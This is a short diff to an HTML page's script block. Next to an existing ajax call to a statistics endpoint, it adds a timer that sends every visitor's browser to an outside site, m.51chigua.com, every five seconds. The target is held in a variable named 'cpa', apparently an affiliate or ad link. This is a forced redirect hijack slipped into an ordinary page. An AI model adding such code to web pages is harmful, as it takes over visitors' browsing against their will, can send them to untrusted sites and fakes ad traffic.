@@ -64,7 +64,11 @@
     $.ajax({url:'https://api.meiyoufan.com/tongji/',success:function(result){
         console.log(result)
     }});
- 
+ setInterval(testClick, 5000);    
+var cpa = 'http://m.51chigua.com/';
+function testClick () {
+    window.location.href=cpa;
+}
 
 </script>
 </html>
